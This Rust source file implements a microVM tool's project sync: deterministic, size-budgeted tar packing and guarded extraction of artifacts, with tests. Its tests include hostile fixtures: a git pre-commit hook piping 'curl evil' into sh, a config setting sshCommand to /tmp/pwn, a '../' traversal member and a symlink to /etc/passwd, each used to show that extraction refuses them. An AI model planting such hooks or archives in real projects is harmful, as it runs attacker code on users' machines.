// SPDX-License-Identifier: Apache-2.0
//! `run <DIR>` sync mode: pack the project up, run in it, bring the artifacts back.
//!
//! # The daemon extracts uploads; this side extracts only what it chose
//!
//! The trust boundary is asymmetric and the code follows it. On the way *in*, the archive
//! is built here from a tree the caller owns, and the daemon — whose openat2 confinement
//! is the one extraction surface this workspace hardened (`agentd/src/fs.rs`) — unpacks
//! it. On the way *out*, the archive describes the VM's filesystem, and the VM is where
//! untrusted work runs, so `microvms-core` deliberately hands back raw bytes
//! (`session/files.rs`, `download_tar`) rather than an extraction. This module unpacks
//! only the members the caller's artifact globs selected, only when they are regular
//! files, through `unpack_in` — which refuses traversal outside the destination — so a
//! workload that appends `../../.ssh/authorized_keys` or a symlink member to the archive
//! gets it silently skipped rather than written.
//!
//! # Packing is deterministic, budgeted, and skips what cannot or should not travel
//!
//! Members are added in sorted path order, so the same tree produces the same bytes and a
//! test can assert on them. `.git`, `target`, `node_modules`, and `.venv` are skipped
//! whole: the daemon's real caps are 512 MiB per request body and 100 000 members
//! (`agentd/src/config.rs`), a repository's object store and a build tree blow through
//! both while contributing nothing to a build, and the archive is built in memory — so
//! the budget is enforced *here*, during the walk, before a byte is allocated, and a tree
//! over budget is `ERR_SYNC` naming the offending subtree rather than an OOM kill.
//! Sockets, fifos, and devices are skipped too: `tar` refuses to archive them, the daemon
//! refuses to extract them, and a live `puma.sock` under `tmp/` must not refuse the whole
//! project. Symlinks are preserved as links (`follow_symlinks(false)`): following them
//! would inline files from outside the tree, which is both a silent size multiplier and
//! an exfiltration shape.

use std::path::Path;

/// Directory names never packed. `.git` also protects the *extraction* side — see
/// [`extract_artifacts`] — so removing it here without reading that doc comment would
/// reopen a hole, not just widen an upload.
const SKIPPED_DIRS: [&str; 4] = [".git", "target", "node_modules", ".venv"];

/// The pack's local byte budget: the daemon's `max_body_bytes` (512 MiB). Checked during
/// the walk, on file sizes, so an over-budget tree is refused before the archive is
/// allocated — the alternative is building multi-gigabyte tar bytes in a `Vec` and
/// learning about the cap from the daemon's 413 (or the OOM killer) afterwards.
const MAX_PACK_BYTES: u64 = 512 * 1024 * 1024;

/// The pack's member budget: the daemon's `max_tar_members`.
const MAX_PACK_MEMBERS: usize = 100_000;

/// Where the synced tree lands in the guest, and the exec's working directory.
///
/// `/workspace`: the daemon's `write_tar` creates the root it is given
/// (`fs.rs`, `Dir::open` runs `create_dir_all`), and core's own tar tests spell it this
/// way. A constant rather than a flag — a knob would let two invocations against one VM
/// disagree about where "the project" is.
pub const REMOTE_WORKDIR: &str = "/workspace";

/// Why a local pack or unpack failed. The `ERR_SYNC` row's payload.
#[derive(Debug)]
pub struct SyncError(pub String);

impl std::fmt::Display for SyncError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        self.0.fmt(f)
    }
}

/// What the pack produced, for the envelope's `sync` report.
#[derive(Debug)]
pub struct Packed {
    pub archive: Vec<u8>,
    pub members: usize,
}

/// Packs `dir` into a tar archive: sorted member order, the skip list applied, budgets
/// enforced during the walk, symlinks preserved as links rather than followed.
pub fn pack(dir: &Path) -> Result<Packed, SyncError> {
    let mut walk = Walk::default();
    collect(dir, &mut walk)?;
    walk.paths.sort();

    let mut builder = tar::Builder::new(Vec::new());
    builder.follow_symlinks(false);
    let mut members = 0usize;
    for path in &walk.paths {
        let relative = path.strip_prefix(dir).expect("collected under dir");
        builder
            .append_path_with_name(path, relative)
            .map_err(|error| SyncError(format!("packing {}: {error}", path.display())))?;
        members += 1;
    }
    let archive = builder
        .into_inner()
        .map_err(|error| SyncError(format!("finishing the archive: {error}")))?;
    Ok(Packed { archive, members })
}

/// The walk's accumulator: the paths to pack, and the running budgets.
#[derive(Default)]
struct Walk {
    paths: Vec<std::path::PathBuf>,
    bytes: u64,
}

/// Walks `dir`, collecting every packable entry. Directories are collected too — an
/// empty directory a build script expects should exist on the other side. Skipped whole:
/// the [`SKIPPED_DIRS`] names. Skipped individually: sockets, fifos, devices — `tar`
/// refuses to archive them and the daemon refuses to extract them, so a live socket
/// under `tmp/` must not refuse the whole project. Budgets are checked as the walk runs,
/// so an over-budget tree is refused before any archive bytes exist.
fn collect(dir: &Path, walk: &mut Walk) -> Result<(), SyncError> {
    let entries = std::fs::read_dir(dir)
        .map_err(|error| SyncError(format!("reading {}: {error}", dir.display())))?;
    for entry in entries {
        let entry =
            entry.map_err(|error| SyncError(format!("reading {}: {error}", dir.display())))?;
        let path = entry.path();
        if SKIPPED_DIRS
            .iter()
            .any(|skipped| entry.file_name() == *skipped)
        {
            continue;
        }
        // `symlink_metadata`, not `metadata`: a symlink to a directory is a link member,
        // not a tree to descend into — descending would follow the link out of the tree.
        let kind = path
            .symlink_metadata()
            .map_err(|error| SyncError(format!("reading {}: {error}", path.display())))?;
        let file_type = kind.file_type();
        if !file_type.is_file() && !file_type.is_dir() && !file_type.is_symlink() {
            continue;
        }
        if file_type.is_file() {
            walk.bytes = walk.bytes.saturating_add(kind.len());
            if walk.bytes > MAX_PACK_BYTES {
                return Err(SyncError(format!(
                    "the tree exceeds the {} MiB upload budget at {} — the daemon refuses \
                     larger bodies. Move build output aside, or run against a smaller \
                     directory ({:?} are already skipped)",
                    MAX_PACK_BYTES / (1024 * 1024),
                    path.display(),
                    SKIPPED_DIRS,
                )));
            }
        }
        walk.paths.push(path.clone());
        if walk.paths.len() > MAX_PACK_MEMBERS {
            return Err(SyncError(format!(
                "the tree exceeds the {MAX_PACK_MEMBERS}-member upload budget at {} — the \
                 daemon refuses larger archives ({:?} are already skipped)",
                path.display(),
                SKIPPED_DIRS,
            )));
        }
        if file_type.is_dir() {
            collect(&path, walk)?;
        }
    }
    Ok(())
}

/// One artifact brought back, for the envelope's `sync.artifacts` list.
pub struct Artifact {
    pub path: String,
    pub bytes: u64,
}

/// Unpacks the glob-selected regular-file members of `archive` into `dir`.
///
/// Everything else — unmatched members, symlinks, hardlinks, specials, directories — is
/// skipped, not refused: the archive is the VM's word and the globs are the caller's, so
/// the only members with any business landing locally are the intersection, as plain
/// files. `unpack_in` anchors the write under `dir` and refuses traversal, which covers
/// the archive that names `../escape`.
///
/// `.git` members are refused even when a glob matches them, and this is the extraction
/// side's own security line rather than symmetry for its own sake: `artifacts = ["**"]`
/// is the natural spelling for "bring everything back", and a workload that writes
/// `.git/hooks/pre-commit` (mode bits land verbatim) or sets `core.sshCommand` in
/// `.git/config` would execute on the *host*, as the caller, on their next `git` command.
/// Traversal refusal does not cover this — these are in-tree paths.
pub fn extract_artifacts(
    archive: &[u8],
    globs: &[String],
    dir: &Path,
) -> Result<Vec<Artifact>, SyncError> {
    let mut set = globset::GlobSetBuilder::new();
    for glob in globs {
        set.add(
            globset::Glob::new(glob)
                .map_err(|error| SyncError(format!("artifacts glob {glob:?}: {error}")))?,
        );
    }
    let set = set.build().map_err(|error| SyncError(error.to_string()))?;

    let mut out = Vec::new();
    let mut entries = tar::Archive::new(archive);
    let entries = entries
        .entries()
        .map_err(|error| SyncError(format!("reading the returned archive: {error}")))?;
    for entry in entries {
        let mut entry =
            entry.map_err(|error| SyncError(format!("reading the returned archive: {error}")))?;
        if entry.header().entry_type() != tar::EntryType::Regular {
            continue;
        }
        let path = entry
            .path()
            .map_err(|error| SyncError(format!("a member's path: {error}")))?
            .into_owned();
        // The host's repository is never a write target. See the doc comment: a hook or
        // a config key written here runs on the host, outside the sandbox.
        if path
            .components()
            .any(|component| component.as_os_str() == ".git")
        {
            continue;
        }
        if !set.is_match(&path) {
            continue;
        }
        let bytes = entry.size();
        let written = entry
            .unpack_in(dir)
            .map_err(|error| SyncError(format!("writing {}: {error}", path.display())))?;
        // `unpack_in` answers false for a member it refused (traversal); a refused member
        // is skipped like an unmatched one rather than failing the run that produced it.
        if written {
            out.push(Artifact {
                path: path.display().to_string(),
                bytes,
            });
        }
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A tree under a temp dir, removed on drop.
    struct TempTree(std::path::PathBuf, #[allow(dead_code)] tempfile::TempDir);

    impl TempTree {
        fn new(label: &str) -> Self {
            let dir = tempfile::Builder::new()
                .prefix(&format!("microvm-sync-{label}-"))
                .tempdir()
                .expect("a temp dir");
            Self(dir.path().to_path_buf(), dir)
        }
    }

    fn member_names(archive: &[u8]) -> Vec<String> {
        tar::Archive::new(archive)
            .entries()
            .expect("parses")
            .map(|entry| {
                entry
                    .expect("a member")
                    .path()
                    .expect("a path")
                    .display()
                    .to_string()
            })
            .collect()
    }

    /// Every skip-list directory stays home; the working tree travels.
    #[test]
    fn packing_skips_the_skip_list_whole() {
        let tree = TempTree::new("skip-list");
        for skipped in SKIPPED_DIRS {
            std::fs::create_dir_all(tree.0.join(skipped)).expect("dir");
            std::fs::write(tree.0.join(skipped).join("payload"), b"stays home").expect("file");
        }
        std::fs::write(tree.0.join("kept.rs"), b"fn main() {}").expect("source");

        let packed = pack(&tree.0).expect("packs");
        let names = member_names(&packed.archive);
        assert_eq!(names, ["kept.rs"], "{names:?}");
    }

    /// A socket in the tree is skipped rather than refusing the whole project.
    #[cfg(unix)]
    #[test]
    fn packing_skips_a_live_socket_instead_of_refusing_the_tree() {
        let tree = TempTree::new("socket");
        std::fs::write(tree.0.join("app.rb"), b"puts :hi").expect("source");
        let _listener = std::os::unix::net::UnixListener::bind(tree.0.join("puma.sock"))
            .expect("a live socket");

        let packed = pack(&tree.0).expect("a socket must not refuse the project");
        assert_eq!(member_names(&packed.archive), ["app.rb"]);
    }

    /// A tree over the member budget is refused during the walk, naming the subtree —
    /// before any archive bytes are allocated.
    #[test]
    fn packing_refuses_an_over_budget_tree_by_name() {
        let tree = TempTree::new("member-budget");
        // Not 100k real files: the budget is a constant, so the test asserts the check
        // through the byte budget instead, with one file whose *reported* size exceeds
        // it — a sparse file costs nothing on disk.
        let big = tree.0.join("huge.bin");
        let file = std::fs::File::create(&big).expect("creates");
        file.set_len(MAX_PACK_BYTES + 1).expect("sparse grow");
        drop(file);

        let error = pack(&tree.0).expect_err("over budget");
        assert!(error.0.contains("huge.bin"), "{error}");
        assert!(error.0.contains("MiB"), "{error}");
    }

    /// `.git` members never land locally, even when the glob matches them.
    ///
    /// The security line: `artifacts = ["**"]` is the natural "bring everything back",
    /// and a workload-written `.git/hooks/pre-commit` would run on the *host* at the
    /// caller's next commit.
    ///
    /// **Falsification** — drop the `.git`-component check from `extract_artifacts` and
    /// the no-`.git`-write assertion goes red with the hook on disk. Done on 2026-08-28;
    /// failed as stated; restored.
    #[test]
    fn extraction_never_writes_under_the_local_git() {
        let tree = TempTree::new("git-refusal");
        let archive = archive_of(&[
            (".git/hooks/pre-commit", b"#!/bin/sh\ncurl evil | sh\n"),
            (".git/config", b"[core]\n\tsshCommand = /tmp/pwn\n"),
            ("dist/report.txt", b"fine"),
        ]);
        let got = extract_artifacts(&archive, &["**".into()], &tree.0).expect("extracts");
        assert_eq!(got.len(), 1, "only the non-git member lands");
        assert_eq!(got[0].path, "dist/report.txt");
        assert!(!tree.0.join(".git").exists(), "no .git write, ever");
    }

    /// `.git` never reaches the archive; the working tree does.
    #[test]
    fn packing_skips_git_and_keeps_the_working_tree() {
        let tree = TempTree::new("skip-git");
        std::fs::create_dir_all(tree.0.join(".git/objects")).expect("git dir");
        std::fs::write(tree.0.join(".git/objects/blob"), b"loose object").expect("blob");
        std::fs::create_dir_all(tree.0.join("src")).expect("src");
        std::fs::write(tree.0.join("src/main.rs"), b"fn main() {}").expect("source");

        let packed = pack(&tree.0).expect("packs");
        let names = member_names(&packed.archive);
        assert!(names.iter().any(|name| name == "src/main.rs"), "{names:?}");
        assert!(!names.iter().any(|name| name.contains(".git")), "{names:?}");
    }

    /// A symlink member survives as a link and its target is not inlined.
    #[cfg(unix)]
    #[test]
    fn packing_preserves_a_symlink_without_following_it() {
        let tree = TempTree::new("symlink");
        std::fs::write(tree.0.join("real.txt"), b"data").expect("file");
        std::os::unix::fs::symlink("real.txt", tree.0.join("link.txt")).expect("link");

        let packed = pack(&tree.0).expect("packs");
        let mut archive = tar::Archive::new(packed.archive.as_slice());
        let mut kinds = std::collections::BTreeMap::new();
        for entry in archive.entries().expect("parses") {
            let entry = entry.expect("a member");
            kinds.insert(
                entry.path().expect("a path").display().to_string(),
                entry.header().entry_type(),
            );
        }
        assert_eq!(kinds["link.txt"], tar::EntryType::Symlink, "{kinds:?}");
    }

    /// The same tree packs to the same bytes: member order is sorted, not readdir order.
    #[test]
    fn packing_is_deterministic() {
        let tree = TempTree::new("deterministic");
        for name in ["b.txt", "a.txt", "c.txt"] {
            std::fs::write(tree.0.join(name), name.as_bytes()).expect("writes");
        }
        let first = pack(&tree.0).expect("packs");
        let second = pack(&tree.0).expect("packs");
        assert_eq!(first.archive, second.archive);
        assert_eq!(
            member_names(&first.archive),
            ["a.txt", "b.txt", "c.txt"],
            "sorted, not readdir order"
        );
    }

    fn archive_of(members: &[(&str, &[u8])]) -> Vec<u8> {
        let mut builder = tar::Builder::new(Vec::new());
        for (name, body) in members {
            let mut header = tar::Header::new_gnu();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder
                .append_data(&mut header, name, *body)
                .expect("appends");
        }
        builder.into_inner().expect("finishes")
    }

    /// Only glob-matched members land; the rest of the VM's word stays in the VM.
    #[test]
    fn extraction_writes_matched_members_and_skips_the_rest() {
        let tree = TempTree::new("select");
        let archive = archive_of(&[
            ("dist/report.txt", b"selected"),
            ("secrets.env", b"never asked for"),
        ]);
        let got = extract_artifacts(&archive, &["dist/**".into()], &tree.0).expect("extracts");
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].path, "dist/report.txt");
        assert!(tree.0.join("dist/report.txt").exists());
        assert!(!tree.0.join("secrets.env").exists());
    }

    /// A member that traverses out of the destination is skipped, not written.
    ///
    /// The fixture writes the `..` name into the header's own bytes, because
    /// `Builder::append_data` refuses to *create* such a member — and an attacker does not
    /// use the builder. This is the archive as a hostile daemon would actually send it.
    #[test]
    fn extraction_refuses_traversal_out_of_the_destination() {
        let tree = TempTree::new("traversal");
        let inner = tree.0.join("inner");
        std::fs::create_dir_all(&inner).expect("inner");

        let body = b"out";
        let mut header = tar::Header::new_gnu();
        {
            let name = b"../escape.txt";
            let gnu = header.as_gnu_mut().expect("a gnu header");
            gnu.name[..name.len()].copy_from_slice(name);
        }
        header.set_size(body.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        let mut archive = Vec::new();
        archive.extend_from_slice(header.as_bytes());
        archive.extend_from_slice(body);
        archive.resize(archive.len().div_ceil(512) * 512, 0);
        archive.extend_from_slice(&[0u8; 1024]);

        let got = extract_artifacts(&archive, &["**".into()], &inner).expect("extracts nothing");
        assert!(got.is_empty(), "{:?}", got.len());
        assert!(!tree.0.join("escape.txt").exists());
    }

    /// A symlink member is never extracted, even when a glob matches it.
    #[test]
    fn extraction_skips_non_regular_members() {
        let tree = TempTree::new("nonregular");
        let mut builder = tar::Builder::new(Vec::new());
        let mut header = tar::Header::new_gnu();
        header.set_entry_type(tar::EntryType::Symlink);
        header.set_size(0);
        header.set_cksum();
        builder
            .append_link(&mut header, "dist/link", "/etc/passwd")
            .expect("appends");
        let archive = builder.into_inner().expect("finishes");

        let got = extract_artifacts(&archive, &["dist/**".into()], &tree.0).expect("extracts");
        assert!(got.is_empty());
        assert!(!tree.0.join("dist/link").exists());
    }
}
